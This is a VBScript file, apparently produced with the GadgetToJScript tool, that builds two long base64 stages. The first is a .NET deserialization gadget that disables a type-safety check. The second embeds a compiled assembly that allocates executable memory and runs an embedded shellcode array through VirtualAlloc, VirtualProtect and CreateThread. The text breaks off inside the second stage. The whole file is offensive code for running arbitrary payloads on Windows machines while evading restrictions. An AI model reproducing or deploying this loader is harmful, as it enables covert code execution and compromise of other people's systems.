Function b64Decode(ByVal enc)
    Dim xmlObj, nodeObj
    Set xmlObj = CreateObject("Msxml2.DOMDocument.3.0")
    Set nodeObj = xmlObj.CreateElement("base64")
    nodeObj.dataType = "bin.base64"
    nodeObj.Text = enc
    b64Decode = nodeObj.nodeTypedValue
    Set nodeObj = Nothing
    Set xmlObj = Nothing
End Function

Function Exec()
    
	Dim stage_1, stage_2

    stage_1 = "AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVy"
stage_1 = stage_1 & "ZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0"
stage_1 = stage_1 & "LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAxxA8UmVz"
stage_1 = stage_1 & "b3VyY2VEaWN0aW9uYXJ5DQogICAgICAgICAgICB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2"
stage_1 = stage_1 & "L3hhbWwvcHJlc2VudGF0aW9uIg0KICAgICAgICAgICAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5m"
stage_1 = stage_1 & "eC8yMDA2L3hhbWwiDQogICAgICAgICAgICB4bWxuczpzPSJjbHItbmFtZXNwYWNlOlN5c3RlbTthc3NlbWJseT1tc2NvcmxpYiIN"
stage_1 = stage_1 & "CiAgICAgICAgICAgIHhtbG5zOmM9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkNvbmZpZ3VyYXRpb247YXNzZW1ibHk9U3lzdGVtLkNv"
stage_1 = stage_1 & "bmZpZ3VyYXRpb24iDQogICAgICAgICAgICB4bWxuczpyPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5SZWZsZWN0aW9uO2Fzc2VtYmx5"
stage_1 = stage_1 & "PW1zY29ybGliIj4NCiAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJ0eXBlIiBPYmplY3RUeXBlPSJ7"
stage_1 = stage_1 & "eDpUeXBlIHM6VHlwZX0iIE1ldGhvZE5hbWU9IkdldFR5cGUiPg0KICAgICAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3Zp"
stage_1 = stage_1 & "ZGVyLk1ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgICAgICAgICAgICAgICAgICA8czpTdHJpbmc+U3lzdGVtLldvcmtmbG93LkNv"
stage_1 = stage_1 & "bXBvbmVudE1vZGVsLkFwcFNldHRpbmdzLCBTeXN0ZW0uV29ya2Zsb3cuQ29tcG9uZW50TW9kZWwsIFZlcnNpb249NC4wLjAuMCwg"
stage_1 = stage_1 & "Q3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1PC9zOlN0cmluZz4NCiAgICAgICAgICAgICAg"
stage_1 = stage_1 & "ICAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgICAgICAgICA8L09iamVjdERhdGFQ"
stage_1 = stage_1 & "cm92aWRlcj4NCiAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJmaWVsZCIgT2JqZWN0SW5zdGFuY2U9"
stage_1 = stage_1 & "IntTdGF0aWNSZXNvdXJjZSB0eXBlfSIgTWV0aG9kTmFtZT0iR2V0RmllbGQiPg0KICAgICAgICAgICAgICAgICAgICA8T2JqZWN0"
stage_1 = stage_1 & "RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgICAgICAgICAgICAgICAgICA8czpTdHJpbmc+ZGlzYWJsZUFj"
stage_1 = stage_1 & "dGl2aXR5U3Vycm9nYXRlU2VsZWN0b3JUeXBlQ2hlY2s8L3M6U3RyaW5nPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHI6Qmlu"
stage_1 = stage_1 & "ZGluZ0ZsYWdzPjQwPC9yOkJpbmRpbmdGbGFncz4NCiAgICAgICAgICAgICAgICAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0"
stage_1 = stage_1 & "aG9kUGFyYW1ldGVycz4NCiAgICAgICAgICAgICAgICA8L09iamVjdERhdGFQcm92aWRlcj4NCiAgICAgICAgICAgICAgICA8T2Jq"
stage_1 = stage_1 & "ZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJzZXQiIE9iamVjdEluc3RhbmNlPSJ7U3RhdGljUmVzb3VyY2UgZmllbGR9IiBNZXRob2RO"
stage_1 = stage_1 & "YW1lPSJTZXRWYWx1ZSI+DQogICAgICAgICAgICAgICAgICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4N"
stage_1 = stage_1 & "CiAgICAgICAgICAgICAgICAgICAgICAgIDxzOk9iamVjdC8+DQogICAgICAgICAgICAgICAgICAgICAgICA8czpCb29sZWFuPnRy"
stage_1 = stage_1 & "dWU8L3M6Qm9vbGVhbj4NCiAgICAgICAgICAgICAgICAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4N"
stage_1 = stage_1 & "CiAgICAgICAgICAgICAgICA8L09iamVjdERhdGFQcm92aWRlcj4NCiAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVy"
stage_1 = stage_1 & "IHg6S2V5PSJzZXRNZXRob2QiIE9iamVjdEluc3RhbmNlPSJ7eDpTdGF0aWMgYzpDb25maWd1cmF0aW9uTWFuYWdlci5BcHBTZXR0"
stage_1 = stage_1 & "aW5nc30iIE1ldGhvZE5hbWUgPSJTZXQiPg0KICAgICAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBh"
stage_1 = stage_1 & "cmFtZXRlcnM+DQogICAgICAgICAgICAgICAgICAgICAgICA8czpTdHJpbmc+bWljcm9zb2Z0OldvcmtmbG93Q29tcG9uZW50TW9k"
stage_1 = stage_1 & "ZWw6RGlzYWJsZUFjdGl2aXR5U3Vycm9nYXRlU2VsZWN0b3JUeXBlQ2hlY2s8L3M6U3RyaW5nPg0KICAgICAgICAgICAgICAgICAg"
stage_1 = stage_1 & "ICAgICAgPHM6U3RyaW5nPnRydWU8L3M6U3RyaW5nPg0KICAgICAgICAgICAgICAgICAgICA8L09iamVjdERhdGFQcm92aWRlci5N"
stage_1 = stage_1 & "ZXRob2RQYXJhbWV0ZXJzPg0KICAgICAgICAgICAgICAgIDwvT2JqZWN0RGF0YVByb3ZpZGVyPg0KICAgICAgICAgICAgPC9SZXNv"
stage_1 = stage_1 & "dXJjZURpY3Rpb25hcnk+Cw=="

    
    stage_2 = "AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRy"
stage_2 = stage_2 & "YWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUB"
stage_2 = stage_2 & "AAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAMc1AAACAAEAAAD/////AQAAAAAAAAAEAQAAAH9TeXN0ZW0uQ29s"
stage_2 = stage_2 & "bGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9"
stage_2 = stage_2 & "bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dAwAAAAZfaXRlbXMFX3NpemUIX3ZlcnNpb24FAAAICAkC"
stage_2 = stage_2 & "AAAACgAAAAoAAAAQAgAAABAAAAAJAwAAAAkEAAAACQUAAAAJBgAAAAkHAAAACQgAAAAJCQAAAAkKAAAACQsAAAAJDAAAAA0GBwMA"
stage_2 = stage_2 & "AAABAQAAAAEAAAAHAgkNAAAADA4AAABhU3lzdGVtLldvcmtmbG93LkNvbXBvbmVudE1vZGVsLCBWZXJzaW9uPTQuMC4wLjAsIEN1"
stage_2 = stage_2 & "bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUEAAAAalN5c3RlbS5Xb3JrZmxvdy5Db21wb25l"
stage_2 = stage_2 & "bnRNb2RlbC5TZXJpYWxpemF0aW9uLkFjdGl2aXR5U3Vycm9nYXRlU2VsZWN0b3IrT2JqZWN0U3Vycm9nYXRlK09iamVjdFNlcmlh"
stage_2 = stage_2 & "bGl6ZWRSZWYCAAAABHR5cGULbWVtYmVyRGF0YXMDBR9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyDgAAAAkPAAAACRAA"
stage_2 = stage_2 & "AAABBQAAAAQAAAAJEQAAAAkSAAAAAQYAAAAEAAAACRMAAAAJFAAAAAEHAAAABAAAAAkVAAAACRYAAAABCAAAAAQAAAAJFwAAAAkY"
stage_2 = stage_2 & "AAAAAQkAAAAEAAAACRkAAAAJGgAAAAEKAAAABAAAAAkbAAAACRwAAAABCwAAAAQAAAAJHQAAAAkeAAAABAwAAAAcU3lzdGVtLkNv"
stage_2 = stage_2 & "bGxlY3Rpb25zLkhhc2h0YWJsZQcAAAAKTG9hZEZhY3RvcgdWZXJzaW9uCENvbXBhcmVyEEhhc2hDb2RlUHJvdmlkZXIISGFzaFNp"
stage_2 = stage_2 & "emUES2V5cwZWYWx1ZXMAAAMDAAUFCwgcU3lzdGVtLkNvbGxlY3Rpb25zLklDb21wYXJlciRTeXN0ZW0uQ29sbGVjdGlvbnMuSUhh"
stage_2 = stage_2 & "c2hDb2RlUHJvdmlkZXII7FE4PwIAAAAKCgMAAAAJHwAAAAkgAAAADw0AAAAAGAAAAk1akAADAAAABAAAAP//AAC4AAAAAAAAAEAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAOH7oOALQJzSG4AUzNIVRoaXMgcHJvZ3JhbSBjYW5ub3QgYmUg"
stage_2 = stage_2 & "cnVuIGluIERPUyBtb2RlLg0NCiQAAAAAAAAAUEUAAEwBAwDr39fpAAAAAAAAAADgACIgCwEwAAAQAAAABgAAAAAAAD4sAAAAIAAA"
stage_2 = stage_2 & "AEAAAAAAABAAIAAAAAIAAAQAAAAAAAAABAAAAAAAAAAAgAAAAAIAAAAAAAADAECFAAAQAAAQAAAAABAAABAAAAAAAAAQAAAAAAAA"
stage_2 = stage_2 & "AAAAAADqKwAATwAAAABAAACYAwAAAAAAAAAAAAAAAAAAAAAAAABgAAAMAAAAPCsAADgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAACAAAAgAAAAAAAAAAAAAAAggAABIAAAAAAAAAAAAAAAudGV4dAAAAKwPAAAAIAAAABAAAAACAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAgAABgLnJzcmMAAACYAwAAAEAAAAAEAAAAEgAAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAADAAAAABgAAAAAgAA"
stage_2 = stage_2 & "ABYAAAAAAAAAAAAAAAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAAHiwAAAAAAABIAAAAAgAFABQhAAAoCgAAAQAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATMAYAnQAAAAEAABECKBAAAAoAAHIBAABwKBEAAAomIGMD"
stage_2 = stage_2 & "AACNFQAAASXQBAAABCgSAAAKChYoEwAACgaOaX4BAAAEfgIAAAQoAgAABgsGKBQAAAoABhYHBo5pKBUAAAoABwaOaX4DAAAEEgIo"
stage_2 = stage_2 & "AwAABiZ+FgAACg0WEwR+FgAAChMFFhYHEQUWEgQoBAAABg0giBMAACgXAAAKAHIRAABwKBEAAAomKwAqYiAAEAAAgAEAAAQagAIA"
stage_2 = stage_2 & "AAQfEIADAAAEKgAAQlNKQgEAAQAAAAAADAAAAHY0LjAuMzAzMTkAAAAABQBsAAAAZAMAACN+AADQAwAAvAQAACNTdHJpbmdzAAAA"
stage_2 = stage_2 & "AIwIAAAgAAAAI1VTAKwIAAAQAAAAI0dVSUQAAAC8CAAAbAEAACNCbG9iAAAAAAAAAAIAAAFXlQI0CQIAAAD6ATMAFgAAAQAAABsA"
stage_2 = stage_2 & "AAAEAAAABAAAAAYAAAAQAAAAFwAAAA8AAAABAAAAAQAAAAEAAAAEAAAAAQAAAAEAAAACAAAAAQAAAAAA9AIBAAAAAAAGABkCmAMG"
stage_2 = stage_2 & "AIYCmAMGAE0BVwMPALgDAAAGAHUBGgMGAPwBGgMGAN0BGgMGAG0CGgMGADkCGgMGAFICGgMGAIwBGgMGAGEBeQMGAD8BeQMGAMAB"
stage_2 = stage_2 & "GgMGAKcB0gIGADQEEwMGACQBmAMGAAEBEwMKAI4E6gMKAHwE6gMGAKQCEwMGAP8DmAMGAKMEEwMGAOYAEwMGAFADEwMGAOwCeQMG"
stage_2 = stage_2 & "AN8AwQIAAAAAKAAAAAAAAQABAAEAEAALA6kEQQABAAEAAAEAADEAAABBAAQABwATAQAACgAAAEkABQAHABEArQBXABEAkQBXABEA"
stage_2 = stage_2 & "oABXADMBUABaAFAgAAAAAIYYQwMGAAEAAAAAAIAAkSDBAF4AAQAAAAAAgACRIEoEZgAFAAAAAACAAJEg2QBvAAkAAAAAAIAAkSAn"
stage_2 = stage_2 & "BHoADwD5IAAAAACRGEkDgAARAAAAAQA3AwAAAgC8AgAAAwALAQAABABZBAAAAQAOBAAAAgC1AgAAAwBjBAIABAA7BAAAAQDHAwAA"
stage_2 = stage_2 & "AgCpAgAAAwAYBAAABAAFAwAABQDaAwAABgDOAAAAAQD5AAAAAgBqAwkAQwMBABEAQwMGABkAQwMKACkAQwMQADEAQwMQADkAQwMQ"
stage_2 = stage_2 & "AEEAQwMQAEkAQwMQAFEAQwMQAFkAQwMQAGEAQwMVAGkAQwMQAHEAQwMQAHkAQwMQAIkAQwMGAIEAQwMGAJkAiQQkALEAmQQqAMkA"
stage_2 = stage_2 & "cAQyALkAHAE3ANEAtgQ9AMkALANGANkAMQNJAC4ACwCEAC4AEwCNAC4AGwCsAC4AIwC1AC4AKwDHAC4AMwDHAC4AOwDHAC4AQwC1"
stage_2 = stage_2 & "AC4ASwDNAC4AUwDHAC4AWwDHAC4AYwDlAC4AawAPAS4AcwAcAWMAewBkAQEAYwMAAAQAGgABAAABBQDBAAEAAAEHAEoEAQAAAQkA"
stage_2 = stage_2 & "2QABAAABCwAnBAEARCwAAAQABIAAAAEAAAAAAAAAAAAAAAAAqQQAAAQAAAAAAAAAAAAAAE4AuAAAAAAABAAAAAAAAAAAAAAATgDq"
stage_2 = stage_2 & "AwAAAAAEAAMAAAAAAABrZXJuZWwzMgBfX1N0YXRpY0FycmF5SW5pdFR5cGVTaXplPTg2NwA8TW9kdWxlPgA8UHJpdmF0ZUltcGxl"
stage_2 = stage_2 & "bWVudGF0aW9uRGV0YWlscz4ANjZCQTlDREIwMDkxRUEwNjRFMTEyRDgwOERFQTFBQTY2ODUxRjJEMDNGQzg3REU5REY0ODQ3MUEz"
stage_2 = stage_2 & "QzZDQ0IzQwBQQUdFX1JFQURXUklURQBQQUdFX0VYRUNVVEUATUVNX0NPTU1JVABtc2NvcmxpYgBWaXJ0dWFsQWxsb2MAbHBUaHJl"
stage_2 = stage_2 & "YWRJZABDcmVhdGVUaHJlYWQAUnVudGltZUZpZWxkSGFuZGxlAGhIYW5kbGUAVmFsdWVUeXBlAGZsQWxsb2NhdGlvblR5cGUAUmV2"
stage_2 = stage_2 & "ZXJzZQBDb21waWxlckdlbmVyYXRlZEF0dHJpYnV0ZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJs"
stage_2 = stage_2 & "ZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAFRhcmdldEZyYW1ld29y"
stage_2 = stage_2 & "a0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3Nl"
stage_2 = stage_2 & "bWJseURlc2NyaXB0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0"
stage_2 = stage_2 & "cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJp"
stage_2 = stage_2 & "bGl0eUF0dHJpYnV0ZQBCeXRlAGR3U3RhY2tTaXplAGR3U2l6ZQBzaXplAFN5c3RlbS5UaHJlYWRpbmcAU3lzdGVtLlJ1bnRpbWUu"
stage_2 = stage_2 & "VmVyc2lvbmluZwBNYXJzaGFsAFRlc3RBc3NlbWJseS5kbGwAcGFyYW0AUHJvZ3JhbQBTeXN0ZW0AU3lzdGVtLlJlZmxlY3Rpb24A"
stage_2 = stage_2 & "WmVybwBTbGVlcABscFN0YXJ0QWRkcgAuY3RvcgAuY2N0b3IASW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBkd01pbGxpc2Vjb25k"
stage_2 = stage_2 & "cwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdN"
stage_2 = stage_2 & "b2RlcwBscFRocmVhZEF0dHJpYnV0ZXMAZHdDcmVhdGlvbkZsYWdzAFN5c3RlbS5XaW5kb3dzLkZvcm1zAFJ1bnRpbWVIZWxwZXJz"
stage_2 = stage_2 & "AGxwQWRkcmVzcwBscFN0YXJ0QWRkcmVzcwBXYWl0Rm9yU2luZ2xlT2JqZWN0AGxwZmxPbGRQcm90ZWN0AFZpcnR1YWxQcm90ZWN0"
stage_2 = stage_2 & "AGZsUHJvdGVjdABmbE5ld1Byb3RlY3QAb3BfRXhwbGljaXQARGlhbG9nUmVzdWx0AFNob3cATWVzc2FnZUJveABJbml0aWFsaXpl"
stage_2 = stage_2 & "QXJyYXkAVGVzdEFzc2VtYmx5AENvcHkAAAAPUwB0AGEAcgB0ACEAIQAAC0UAbgBkACEAIQAAAAAAhyfmo9TMukeVOd+h15w9HAAE"
stage_2 = stage_2 & "IAEBCAMgAAEFIAEBEREEIAEBDgQgAQECCQcGHQUYCRgJGAUAARFRDgcAAgESXRFhBAABGAgFAAEBEl0IAAQBHQUIGAgCBhgEAAEB"
stage_2 = stage_2 & "CAi3elxWGTTgiQIGCQMGERAHAAQYGAkJCQgABAIYCAkQCQoABhgJCRgYCRAJBQACCRgJAwAAAQgBAAgAAAAAAB4BAAEAVAIWV3Jh"
stage_2 = stage_2 & "cE5vbkV4Y2VwdGlvblRocm93cwEIAQAHAQAAAAARAQAMVGVzdEFzc2VtYmx5AAAFAQAAAAAXAQASQ29weXJpZ2h0IMKpICAyMDIw"
stage_2 = stage_2 & "AAApAQAkYjJiM2FkYjAtMTY2OS00Yjk0LTg2Y2ItNmRkNjgyZGRiZWEzAAAMAQAHMS4wLjAuMAAARwEAGi5ORVRGcmFtZXdvcmss"
stage_2 = stage_2 & "VmVyc2lvbj12NC4wAQBUDhRGcmFtZXdvcmtEaXNwbGF5TmFtZRAuTkVUIEZyYW1ld29yayA0BAEAAAAAAAAAAAAA86hDwQAAAAAC"
stage_2 = stage_2 & "AAAAdgAAAHQrAAB0DQAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAFJTRFNySQ4lyWYCRate34+TqiibAQAAAEM6XFVzZXJz"
stage_2 = stage_2 & "XHdvcmtsYXB0b3AyXERvY3VtZW50c1xHaXRIdWJcR2FkZ2V0VG9KU2NyaXB0XFRlc3RBc3NlbWJseVxvYmpcRGVidWdcVGVzdEFz"
stage_2 = stage_2 & "c2VtYmx5LnBkYgASLAAAAAAAAAAAAAAsLAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHiwAAAAAAAAAAAAAAABfQ29yRGxsTWFp"
stage_2 = stage_2 & "bgBtc2NvcmVlLmRsbAAAAAAAAAD/JQAgABBYUFhQw1hQX1hQWFDPdVhQSVhQRVhQAFUwWFAXFIpYUB8UAlhQBxSIWFAfFIZYUAcU"
stage_2 = stage_2 & "ilhQBxwCWFDA/lhQWFDbMVhQ1nVYUMD+WFAHFIhYUB8UhlhQBxSKWFAWHAJYUA/igFhQwolYUAccAlhQWFDbMVhQAAABAO+BWFD1"
stage_2 = stage_2 & "dVhQwP5YUKpYUFhQwDFYUFhQWFBeWFBYUA18Y4Akk+g0IVkv8oqCfZIAAAAS6FhQ34lYUFdYUFVYUF1YUFlYUFtYUNh1WFDGKVhQ"
stage_2 = stage_2 & "wwFYUFhQWFDV/1hQX8jZAmhYUFdYUFNYUFZYUABqWFBYUFBYUFZYUFNYUAAAAQCYjVhQ1f9YUOVTpFhoWFAAalhQUVhQAAAQAGhY"
stage_2 = stage_2 & "UEBqWFAAAAEAjo1YULIvInz2gVhQNotYUFhQ1f9YUF/I2QJoWFBXWFBWWFAEalhQAGpYUFhQWFBYUFhQWFDV/1hQVqK18GhYUFhQ"
stage_2 = stage_2 & "WFDUdVhQCE7/WFBYUFhQIHRYUMCFWFBYUNX/WFBhdKWZaFhQV1hQVlhQEGpYUFhQWFCXWFDV/1hQ4N8P6mhYUFBYUEBYUFBYUEBY"
stage_2 = stage_2 & "UFBYUFBYUFBYUFBYUFhQ5olYUPD2AAJoWFCAE6jAaFhQWFBYUApqWFBYUFhQ1f9YUABrgCloWFBQWFBUWFDEKVhQAAABkLhYUFhQ"
stage_2 = stage_2 & "0P9YUOiJWFAHJndMaFhQVFhQXzJzd2hYUAAAMjNoWFBYUFhQWFBdWFBYUFhQ///+5ulYUBKLWFBaWFBfWFBYUFhYUFhQ4P9YUFFY"
stage_2 = stage_2 & "UFpYUFlYUGFYUFtYUFtYUCQkRIlYUNABWFCLBItYUNMBWFAcWItYUEsMi2ZYUNMBWFAkWItYUFhYUFhQuHVYUCR9O1hQ+H0DWFBY"
stage_2 = stage_2 & "UOh1WFDgOFhQxwFYUA3PwVhQrFhQwDFYUFhQ1gFYUIs0i1hQ/zFYUElYUFhQAAAAgIQPWFDJhVhQWFDTAVhQIFiLWFBQWFAYSItY"
stage_2 = stage_2 & "UNABWFBYUAAAAKqED1hQwIVYUHhAi1hQ0AFYUFdYUDxCi1hQEFKLWFBSWFBYUNl1WFBJWFDHAVhQDc/BWFBYUCAsWFBYUAh8WFBh"
stage_2 = stage_2 & "PFhQrFhQwDFYUFhQKHKLWFD/MVhQJkq3D1hQWFAUUotYUAxSi1hQMFKLZFhQ5YlYUNIxWFBgWFBYUFhQAAABP+hYUPwAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAAAQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAA"
stage_2 = stage_2 & "SAAAAFhAAAA8AwAAAAAAAAAAAAA8AzQAAABWAFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAA"
stage_2 = stage_2 & "AAAAAQAAAAAAPwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAAJAAEAAAA"
stage_2 = stage_2 & "VAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEnAIAAAEAUwB0AHIAaQBuAGcARgBpAGwAZQBJAG4AZgBvAAAAeAIAAAEAMAAw"
stage_2 = stage_2 & "ADAAMAAwADQAYgAwAAAAGgABAAEAQwBvAG0AbQBlAG4AdABzAAAAAAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAAAAAA"
stage_2 = stage_2 & "AAAAAEIADQABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABUAGUAcwB0AEEAcwBzAGUAbQBiAGwAeQAAAAAAMAAI"
stage_2 = stage_2 & "AAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAxAC4AMAAuADAALgAwAAAAQgARAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUA"
stage_2 = stage_2 & "AABUAGUAcwB0AEEAcwBzAGUAbQBiAGwAeQAuAGQAbABsAAAAAABIABIAAQBMAGUAZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAABD"
stage_2 = stage_2 & "AG8AcAB5AHIAaQBnAGgAdAAgAKkAIAAgADIAMAAyADAAAAAqAAEAAQBMAGUAZwBhAGwAVAByAGEAZABlAG0AYQByAGsAcwAAAAAA"
stage_2 = stage_2 & "AAAAAEoAEQABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABUAGUAcwB0AEEAcwBzAGUAbQBiAGwAeQAuAGQAbABs"
stage_2 = stage_2 & "AAAAAAA6AA0AAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAFQAZQBzAHQAQQBzAHMAZQBtAGIAbAB5AAAAAAA0AAgAAQBQAHIA"
stage_2 = stage_2 & "bwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIAcwBp"
stage_2 = stage_2 & "AG8AbgAAADEALgAwAC4AMAAuADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAAEA8AAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQPAAAAH1N5c3RlbS5Vbml0eVNlcmlhbGl6YXRpb25I"
stage_2 = stage_2 & "b2xkZXIDAAAABERhdGEJVW5pdHlUeXBlDEFzc2VtYmx5TmFtZQEAAQgGIQAAAP4BU3lzdGVtLkxpbnEuRW51bWVyYWJsZStXaGVy"
stage_2 = stage_2 & "ZVNlbGVjdEVudW1lcmFibGVJdGVyYXRvcmAyW1tTeXN0ZW0uQnl0ZVtdLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0"
stage_2 = stage_2 & "dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwg"
stage_2 = stage_2 & "bXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5"
stage_2 = stage_2 & "XV0EAAAABiIAAABOU3lzdGVtLkNvcmUsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1i"
